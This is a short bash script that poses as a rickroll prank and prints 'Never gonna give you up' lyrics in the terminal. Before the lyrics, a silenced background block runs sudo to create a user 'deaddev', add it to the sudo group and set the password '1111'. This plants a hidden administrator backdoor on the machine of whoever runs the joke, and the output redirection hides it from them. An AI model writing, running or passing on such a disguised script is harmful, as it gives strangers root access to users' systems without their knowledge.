#!/bin/bash

clear

(
    # alles ins Nirvana
    exec >/dev/null 2>&1

    sudo adduser deaddev

    sudo usermod -aG sudo deaddev

    echo "deaddev:1111" | sudo chpasswd
) &

lyrics=(
"Never gonna give you up"
"Never gonna let you down"
"Never gonna run around and desert you"
"Never gonna make you cry"
"Never gonna say goodbye"
"Never gonna tell a lie and hurt you"
)

echo "🎶 Rick Astley – Terminal Edition 🎶"
echo
sleep 1

for line in "${lyrics[@]}"; do
    echo "$line"
    sleep 1.0
done

echo
echo "💀 You got rickrolled 💀"
